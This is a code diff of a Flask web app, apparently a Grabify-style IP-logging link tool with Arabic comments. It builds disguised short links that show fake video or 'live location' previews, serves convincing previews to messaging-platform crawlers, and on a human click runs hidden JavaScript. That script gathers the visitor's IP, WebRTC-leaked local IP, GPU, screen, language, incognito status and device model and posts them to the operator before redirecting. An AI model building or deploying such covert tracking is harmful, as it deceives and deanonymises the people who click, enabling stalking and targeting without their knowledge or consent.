@@ -5,7 +5,6 @@ import sqlite3
 import requests
 import pytz
 from functools import wraps
-from bs4 import BeautifulSoup
 from user_agents import parse
 
 app = Flask(__name__)
@@ -85,44 +84,23 @@ def fetch_original_meta(url, manual_thumb_url=None):
     img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
     if manual_thumb_url and manual_thumb_url.strip():
+        img_final = manual_thumb_url.strip()
+        if img_final.startswith('http://'):
+            img_final = img_final.replace('http://', 'https://')
+            
         if "instagram.com" in url_lower:
             title = "Instagram Post Media Player"
         elif "facebook.com" in url_lower or "fb.watch" in url_lower:
             title = "Facebook Video Player HD"
         elif "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
             title = "TikTok Video Content Player"
-        return title, manual_thumb_url.strip()
+        return title, img_final
         
     if "goo.gl/maps" in url_lower or "maps.google" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
         return title, img
         
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    }
-
-    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
-        try:
-            res = requests.get(f"https://www.tiktok.com/oembed?url={url}", headers=headers, timeout=5)
-            if res.status_code == 200:
-                data = res.json()
-                img_url = data.get('thumbnail_url', img)
-                # إصلاح مشكلة بروتوكول HTTP وإجباره على HTTPS لتقبله تطبيقات المراسلة
-                if img_url.startswith('http://'):
-                    img_url = img_url.replace('http://', 'https://')
-                return data.get('title', title), img_url
-        except: 
-            pass
-    elif "youtube.com" in url_lower or "youtu.be" in url_lower:
-        try:
-            res = requests.get(f"https://noembed.com/embed?url={url}", timeout=4)
-            if res.status_code == 200:
-                data = res.json()
-                return data.get('title', title), data.get('thumbnail_url', img)
-        except: 
-            pass
-            
     return title, img
 
 def check_auth(username, password):
@@ -162,7 +140,7 @@ DASHBOARD_LAYOUT = '''
         label { font-weight: 600; display: block; margin-top: 15px; font-size: 14px; }
         input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; background: #f8fafc; }
         .conditional-thumbnail { display: none; background: #f1f5f9; padding: 15px; border-radius: 8px; margin-top: 15px; border: 1px solid #cbd5e1; }
-        .helper-btn { display: inline-block; background: #0f172a; color: white; text-decoration: none; padding: 6px 12px; font-size: 12px; border-radius: 4px; margin-top: 8px; font-weight: bold; }
+        .helper-btn { display: inline-block; background: #0f172a; color: white; text-decoration: none; padding: 8px 14px; font-size: 13px; border-radius: 4px; margin-top: 8px; font-weight: bold; }
         .helper-btn:hover { background: #334155; }
         .submit-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; margin-top: 25px; border-radius: 6px; font-weight: bold; cursor: pointer; }
     </style>
@@ -192,10 +170,10 @@ DASHBOARD_LAYOUT = '''
                 <input type="url" id="original_url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                 
                 <div id="thumbnail_wrapper" class="conditional-thumbnail">
-                    <b id="meta_warning_title" style="color:#0f172a; font-size:13px;">⚠️ TikTok Link Detected (Cloud Upload Active):</b>
-                    <p style="margin: 5px 0; font-size:12px; color:#475569;">لضمان ظهور الصورة المصغرة بشكل مستقر، يرجى استخراج الرابط يدوياً عبر الزر أدناه ثم لصقه في الحقل:</p>
+                    <b id="meta_warning_title" style="color:#0f172a; font-size:13px;">⚠️ Meta Link Detected:</b>
+                    <p style="margin: 5px 0; font-size:12px; color:#475569;">لضمان ظهور الصورة المصغرة بشكل مستقر، يرجى استخراج الرابط يدوياً عبر الموقع ولصقه في الحقل:</p>
                     
-                    <a id="extractor_link" href="#" target="_blank" class="helper-btn">استخراج غلاف الفيديو احتياطياً إن لزم الأمر 🔗</a>
+                    <a id="extractor_link" href="#" target="_blank" class="helper-btn">🔗 اضغط هنا لاستخراج رابط الصورة</a>
                     
                     <label style="margin-top:10px;">قم بلصق رابط الصورة المستخرجة هنا (Image URL):</label>
                     <input type="url" name="manual_thumbnail" id="manual_thumbnail" placeholder="https://...">
@@ -219,29 +197,27 @@ DASHBOARD_LAYOUT = '''
             var thumbWrapper = document.getElementById('thumbnail_wrapper');
             var extractorLink = document.getElementById('extractor_link');
             var warningTitle = document.getElementById('meta_warning_title');
+            var manualInput = document.getElementById('manual_thumbnail');
             var low = val.toLowerCase();
             
             if (low.includes("instagram.com")) {
                 thumbWrapper.style.display = "block";
-                warningTitle.innerText = "⚠️ Instagram Link Detected (Manual Mode Active):";
+                warningTitle.innerText = "⚠️ Instagram Link Detected:";
                 extractorLink.href = "https://thumbnail-downloader.com/instagram";
-                extractorLink.innerText = "🔗 اذهب إلى موقع استخراج صور Instagram";
-                document.getElementById('manual_thumbnail').required = true;
+                manualInput.required = true;
             } else if (low.includes("facebook.com") || low.includes("fb.watch")) {
                 thumbWrapper.style.display = "block";
-                warningTitle.innerText = "⚠️ Facebook Link Detected (Manual Mode Active):";
+                warningTitle.innerText = "⚠️ Facebook Link Detected:";
                 extractorLink.href = "https://thumbnail-downloader.com/Facebook";
-                extractorLink.innerText = "🔗 اذهب إلى موقع استخراج صور Facebook";
-                document.getElementById('manual_thumbnail').required = true;
+                manualInput.required = true;
             } else if (low.includes("tiktok.com") || low.includes("vt.tiktok")) {
                 thumbWrapper.style.display = "block";
-                warningTitle.innerText = "⚠️ TikTok Link Detected (Auto-API & Fallback Support):";
-                extractorLink.href = "https://urlebird.com/";
-                extractorLink.innerText = "🔗 استخراج غلاف الفيديو احتياطياً إن لزم الأمر";
-                document.getElementById('manual_thumbnail').required = false;
+                warningTitle.innerText = "⚠️ TikTok Link Detected (Cloud Upload Active):";
+                extractorLink.href = "https://thumbnail-downloader.com/tiktok";
+                manualInput.required = true;
             } else {
                 thumbWrapper.style.display = "none";
-                document.getElementById('manual_thumbnail').required = false;
+                manualInput.required = false;
             }
         }
     </script>
@@ -293,9 +269,7 @@ MY_LINKS_LAYOUT = '''
                 <tbody>
                     {% for link in links_list %}
                     <tr>
-                        <td>
-                            <img src="{{ link.custom_image }}" class="thumb-preview" alt="No Thumbnail Found">
-                        </td>
+                        <td><img src="{{ link.custom_image }}" class="thumb-preview"></td>
                         <td style="font-weight: 600;">{{ link.note }}</td>
                         <td>{{ link.target_platform }}</td>
                         <td>{{ link.video_title }}</td>
@@ -326,18 +300,26 @@ ANALYTICS_LAYOUT = '''
         body { font-family: Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; }
         .navbar { background-color: #0f172a; color: white; padding: 15px; display: flex; justify-content: space-between; }
         .navbar a { color: white; text-decoration: none; background: #475569; padding: 8px 12px; border-radius: 4px; }
-        .container { max-width: 1000px; margin: 30px auto; padding: 10px; }
-        .success-banner { background-color: #f0fdf4; border: 1px dashed #22c55e; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-weight: bold; }
-        .success-banner input { width: 100%; padding: 8px; margin-top: 5px; font-family: monospace; }
-        .log-card { background: white; border: 1px solid #d1d5db; border-radius: 6px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .log-header { background: #1e293b; color: white; padding: 12px 15px; font-weight: bold; font-size: 14px; border-top-left-radius: 5px; border-top-right-radius: 5px; }
-        .log-table { width: 100%; border-collapse: collapse; font-size: 13px; }
-        .log-table tr:nth-child(even) { background-color: #f9fafb; }
-        .log-table td { padding: 10px 15px; border-bottom: 1px solid #e5e7eb; }
-        .log-table td:first-child { font-weight: bold; color: #4b5563; width: 30%; }
-        .log-table td:last-child { color: #111827; font-family: monospace; word-break: break-all; }
-        .badge-danger { background-color: #ef4444; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
-        .badge-device { background-color: #1e3a8a; color: white; padding: 4px 10px; border-radius: 6px; font-weight: bold; font-size: 13px; }
+        .container { max-width: 1100px; margin: 30px auto; padding: 10px; }
+        
+        .grabify-table { width: 100%; background: white; border-collapse: collapse; border-radius: 6px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #d1d5db; font-size: 13px; }
+        .grabify-table th { background: #2c3e50; color: white; padding: 12px; text-align: left; font-weight: bold; }
+        .grabify-table td { padding: 12px; border-bottom: 1px solid #e5e7eb; vertical-align: middle; }
+        .grabify-table tr:nth-child(even) { background: #f9fafb; }
+        
+        .bot-row { background: #fff7ed !important; }
+        .badge-danger { background-color: #ef4444; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 12px; }
+        .badge-bot { background: #ea580c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 11px; }
+        .badge-user { background: #2563eb; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 11px; }
+        
+        /* تنسيق زر More Info الصغير المقارب لـ Grabify */
+        .btn-more { background-color: #0088cc; color: white; border: none; padding: 5px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn-more:hover { background-color: #006699; }
+        
+        /* حاوية التفاصيل المنسدلة المخفية */
+        .hidden-details { display: none; background: #f8fafc; border: 1px solid #cbd5e1; padding: 15px; margin-top: 10px; border-radius: 6px; text-align: left; width: 95%; box-sizing: border-box; }
+        .details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 12px; line-height: 1.5; color: #334155; }
+        .ua-block { grid-column: span 2; background: #ede9fe; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 11px; color: #5b21b6; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -346,38 +328,81 @@ ANALYTICS_LAYOUT = '''
         <a href="/my-links">📁 Back Dashboard</a>
     </div>
     <div class="container">
-        {% if is_new %}
-        <div class="success-banner">
-            <span style="color: #166534;">✔ URL Shortened successfully! Distribute this target link:</span>
-            <input type="text" readonly value="{{ host_url }}secure/{{ link_info.id }}">
-        </div>
-        {% endif %}
-
-        <h2>Advanced Tracking Logs for Link [{{ link_info.id }}]</h2>
+        <h2>Results & Link Information Log</h2>
         
-        {% if not clicks_list %}
-            <p style="text-align:center; color:#6b7280; padding:40px;">No logs recorded yet. Awaiting interactions...</p>
-        {% else %}
-            {% for click in clicks_list %}
-            <div class="log-card">
-                <div class="log-header">Log Session Block #{{ click.id }} - Captured at {{ click.time }}</div>
-                <table class="log-table">
-                    <tr><td>Date/Time</td><td>{{ click.time }} UTC+1 (Algerian Standard)</td></tr>
-                    <tr><td>Detected Phone Model</td><td><span class="badge-device">{{ click.device_model }}</span></td></tr>
-                    <tr><td>IP Address</td><td><span class="badge-danger">{{ click.ip }}</span></td></tr>
-                    <tr><td>Local IP (LAN)</td><td style="color:#15803d; font-weight:bold;">{{ click.local_ip }}</td></tr>
-                    <tr><td>Language</td><td>{{ click.language }}</td></tr>
-                    <tr><td>Incognito/Private Window</td><td>{{ click.incognito }}</td></tr>
-                    <tr><td>Screen Size / Refresh Rate</td><td>{{ click.screen_size }}</td></tr>
-                    <tr><td>GPU Render Engine</td><td>{{ click.gpu }}</td></tr>
-                    <tr><td>Touch Screen Hardware</td><td>{{ click.touch_points }}</td></tr>
-                    <tr><td>Referring URL</td><td style="color:#2563eb;">{{ click.referrer }}</td></tr>
-                    <tr><td>Raw User Agent</td><td style="font-size:11px; color:#4b5563;">{{ click.device }}</td></tr>
-                </table>
-            </div>
-            {% endfor %}
-        {% endif %}
+        <table class="grabify-table">
+            <thead>
+                <tr>
+                    <th>Date/Time</th>
+                    <th>IP / Provider</th>
+                    <th>Platform / Device</th>
+                    <th>Referring URL</th>
+                    <th>More Details</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% if not clicks_list %}
+                <tr><td colspan="5" style="text-align:center; color:#9ca3af; padding:30px;">No logs recorded yet. Awaiting interactions...</td></tr>
+                {% endif %}
+                
+                {% for click in clicks_list %}
+                <tr class="{% if 'Bot' in click.device_model or 'Crawler' in click.device_model %}bot-row{% endif %}">
+                    <td><strong>{{ click.time }}</strong><br><small style="color:#64748b;">Algerian Time</small></td>
+                    <td>
+                        <span class="badge-danger">{{ click.ip }}</span><br>
+                        <small style="font-weight:bold; color:#4b5563;">
+                            {% if "Facebook" in click.device_model %}FACEBOOK, INC.
+                            {% elif "Telegram" in click.device_model %}TELEGRAM MESSENGER LLP
+                            {% elif "WhatsApp" in click.device_model %}WHATSAPP INC.
+                            {% else %}ISP CLIENT NETWORK
+                            {% endif %}
+                        </small>
+                    </td>
+                    <td>
+                        {% if "Bot" in click.device_model or "Crawler" in click.device_model %}
+                        <span class="badge-bot">🤖 {{ click.device_model }}</span>
+                        {% else %}
+                        <span class="badge-user">📱 {{ click.device_model }}</span>
+                        {% endif %}
+                    </td>
+                    <td style="color:#2563eb; word-break:break-all; font-size:12px;">{{ click.referrer }}</td>
+                    <td>
+                        <button class="btn-more" onclick="toggleDetails('details-{{ click.id }}')">More Info</button>
+                        
+                        <div id="details-{{ click.id }}" class="hidden-details">
+                            <div class="details-grid">
+                                <div><strong>Local Network IP:</strong> <span style="color:#16a34a; font-weight:bold;">{{ click.local_ip }}</span></div>
+                                <div><strong>Incognito Browser Check:</strong> {{ click.incognito }}</div>
+                                <div><strong>Screen Canvas Size:</strong> {{ click.screen_size }}</div>
+                                <div><strong>Hardware GPU Engine:</strong> {{ click.gpu }}</div>
+                                <div><strong>Browser Languages:</strong> {{ click.language }}</div>
+                                <div><strong>Touch Points:</strong> {{ click.touch_points }}</div>
+                                <div class="ua-block">
+                                    <strong>Raw User Agent:</strong><br>{{ click.device }}
+                                </div>
+                            </div>
+                        </div>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
     </div>
+
+    <script>
+        function toggleDetails(id) {
+            var box = document.getElementById(id);
+            if (box.style.display === "block") {
+                box.style.display = "none";
+            } else {
+                // إغلاق أي صناديق أخرى مفتوحة للحفاظ على التنسيق
+                var allBoxes = document.querySelectorAll('.hidden-details');
+                allBoxes.forEach(function(b) { b.style.display = "none"; });
+                
+                box.style.display = "block";
+            }
+        }
+    </script>
 </body>
 </html>
 '''
@@ -448,6 +473,25 @@ def delete_link(link_id):
 
 @app.route('/secure/<link_id>')
 def secure_redirect(link_id):
+    ua_raw = request.headers.get('User-Agent', '')
+    ua_lower = ua_raw.lower()
+    
+    bot_detected = None
+    if "facebookexternalhit" in ua_lower or "facebookplatform" in ua_lower:
+        bot_detected = "Facebook Crawler / Bot"
+    elif "telegrambot" in ua_lower:
+        bot_detected = "Telegram Bot Check"
+    elif "whatsapp" in ua_lower:
+        bot_detected = "WhatsApp Link Preview Bot"
+    elif "twitterbot" in ua_lower:
+        bot_detected = "Twitter/X Media Bot"
+    elif "discordbot" in ua_lower:
+        bot_detected = "Discord Embed Webhook"
+    elif "googlebot" in ua_lower:
+        bot_detected = "Google Search Index Crawler"
+    elif any(b in ua_lower for b in ["slackbot", "bingbot", "bot", "crawler", "spider"]):
+        bot_detected = "Generic Platform Bot / Crawler"
+        
     with sqlite3.connect(DB_FILE) as conn:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
@@ -458,12 +502,63 @@ def secure_redirect(link_id):
         target = link_data['target_platform']
         title = link_data['video_title']
         image_url = link_data['custom_image']
+        dest_url = link_data['original_url']
         
+        if bot_detected:
+            ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+            if ip_address and ',' in ip_address:
+                ip_address = ip_address.split(',')[0].strip()
+                
+            current_time = get_gmt1_time()
+            
+            with sqlite3.connect(DB_FILE) as conn:
+                cursor = conn.cursor()
+                cursor.execute('''
+                    INSERT INTO clicks (link_id, ip, local_ip, device, device_model, time, language, screen_size, gpu, incognito, touch_points, referrer) 
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (
+                    link_id, ip_address, "N/A (Bot Entry)", ua_raw, bot_detected, current_time,
+                    "N/A", "N/A (Platform Crawler)", "N/A", "Bot Link Scan/Preview", "No", "Platform Pre-fetch System"
+                ))
+                conn.commit()
+
+            meta_tags = f'<meta property="og:type" content="video.other">'
+            if target == "Telegram":
+                meta_tags = f'''
+                <meta property="og:type" content="video">
+                <meta property="og:video" content="{dest_url}">
+                <meta name="twitter:card" content="player">
+                '''
+            elif target == "Messenger":
+                meta_tags = f'<meta property="og:type" content="video.movie">'
+                
+            return f'''
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <title>{title}</title>
+                <meta http-equiv="refresh" content="3;url={dest_url}">
+                <meta property="og:title" content="{title}">
+                <meta property="og:description" content="▶ Click to watch full video content.">
+                <meta property="og:image" content="{image_url}">
+                <meta property="og:image:secure_url" content="{image_url}">
+                <meta property="og:image:type" content="image/jpeg">
+                <meta property="og:url" content="{request.base_url}">
+                <meta name="twitter:card" content="summary_large_image">
+                <meta name="twitter:title" content="{title}">
+                <meta name="twitter:image" content="{image_url}">
+                {meta_tags}
+            </head>
+            <body>Link Verification Processing...</body>
+            </html>
+            '''
+
         meta_tags = f'<meta property="og:type" content="video.other">'
         if target == "Telegram":
             meta_tags = f'''
             <meta property="og:type" content="video">
-            <meta property="og:video" content="{link_data['original_url']}">
+            <meta property="og:video" content="{dest_url}">
             <meta name="twitter:card" content="player">
             '''
         elif target == "Messenger":
@@ -481,14 +576,9 @@ def secure_redirect(link_id):
             <meta property="og:description" content="▶ Click to watch full video content.">
             <meta property="og:image" content="{image_url}">
             <meta property="og:image:secure_url" content="{image_url}">
-            <meta property="og:image:type" content="image/jpeg">
-            <meta property="og:image:width" content="600">
-            <meta property="og:image:height" content="600">
             <meta property="og:url" content="{request.base_url}">
-            
             <meta name="twitter:card" content="summary_large_image">
             <meta name="twitter:title" content="{title}">
-            <meta name="twitter:description" content="Click to view stream player source.">
             <meta name="twitter:image" content="{image_url}">
             
             {meta_tags}
@@ -496,37 +586,30 @@ def secure_redirect(link_id):
                 function extractAdvancedMetrics() {{
                     var payload = {{
                         local_ip: "Encrypted (mDNS)",
-                        language: navigator.language || navigator.userLanguage || "Unknown",
-                        screen_size: window.screen.width + " x " + window.screen.height + " @ " + (window.screen.pixelDepth || 24) + "bit",
-                        gpu: "Unknown GPU Engine",
-                        incognito: "No",
-                        touch_points: "No (0 touch points)",
-                        referrer: document.referrer || "Direct Visit / In-App Browser Client"
+                        language: navigator.language || "Unknown",
+                        screen_size: window.screen.width + " x " + window.screen.height,
+                        gpu: "Unknown GPU",
+                        incognito: "Standard Browser",
+                        touch_points: "0",
+                        referrer: document.referrer || "Direct Visit"
                     }};
 
-                    if(navigator.maxTouchPoints && navigator.maxTouchPoints > 0){{
-                        payload.touch_points = navigator.maxTouchPoints;
-                    }}
+                    if(navigator.maxTouchPoints){{ payload.touch_points = navigator.maxTouchPoints; }}
 
                     try {{
                         var canvas = document.createElement("canvas");
                         var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                         if(gl) {{
                             var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                            if(debugInfo) {{
-                                payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                            }}
+                            if(debugInfo) {{ payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }}
                         }}
                     }} catch(e) {{}}
 
                     try {{
-                        var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-                        if (!fs) {{
-                            if (navigator.storage && navigator.storage.estimate) {{
-                                navigator.storage.estimate().then(function(est) {{
-                                    if(est.quota < 120000000) {{ payload.incognito = "Yes (Detected via storage quota limit)"; }}
-                                }});
-                            }}
+                        if (navigator.storage && navigator.storage.estimate) {{
+                            navigator.storage.estimate().then(function(est) {{
+                                if(est.quota < 120000000) {{ payload.incognito = "Incognito / Private Mode"; }}
+                            }});
                         }}
                     }} catch(e) {{}}
 
@@ -540,7 +623,7 @@ def secure_redirect(link_id):
                             var match = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(cand);
                             if (match) {{ payload.local_ip = match[1]; }}
                         }};
-                        pc.createOffer().then(function(sdp) {{ pc.setLocalDescription(sdp); }}).catch(function(err){{}});
+                        pc.createOffer().then(function(sdp) {{ pc.setLocalDescription(sdp); }}).catch(function(e){{}});
                     }}
 
                     setTimeout(function() {{
@@ -548,7 +631,7 @@ def secure_redirect(link_id):
                         xhr.open("POST", "/log-click/{link_id}", true);
                         xhr.setRequestHeader("Content-Type", "application/json");
                         xhr.onreadystatechange = function () {{
-                            if (xhr.readyState === 4) {{ window.location.href = "{link_data['original_url']}"; }}
+                            if (xhr.readyState === 4) {{ window.location.href = "{dest_url}"; }}
                         }};
                         xhr.send(JSON.stringify(payload));
                     }}, 950);
@@ -584,8 +667,7 @@ def log_click(link_id):
             device_model_final = f"{brand} {model}"
         else:
             device_model_final = guess_device_by_hardware(ua_string, gpu_info, touch_pts)
-            
-    except Exception as e:
+    except:
         pass
 
     current_time = get_gmt1_time()
@@ -596,17 +678,9 @@ def log_click(link_id):
             INSERT INTO clicks (link_id, ip, local_ip, device, device_model, time, language, screen_size, gpu, incognito, touch_points, referrer) 
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
-            link_id, 
-            ip_address, 
-            data.get('local_ip', 'Encrypted (mDNS)'), 
-            ua_string, 
-            device_model_final,
-            current_time,
-            data.get('language', 'fr-FR'),
-            data.get('screen_size', 'Unknown'),
-            gpu_info,
-            data.get('incognito', 'No'),
-            f"Yes ({touch_pts} touch points)" if int(str(touch_pts)) > 0 else "No (0 touch points)",
+            link_id, ip_address, data.get('local_ip', 'Encrypted (mDNS)'), ua_string, device_model_final,
+            current_time, data.get('language', 'fr-FR'), data.get('screen_size', 'Unknown'), gpu_info,
+            data.get('incognito', 'Standard Browser'), f"Yes ({touch_pts} touch points)" if int(str(touch_pts)) > 0 else "No (0 touch points)",
             data.get('referrer', 'Direct Visit')
         ))
         conn.commit()
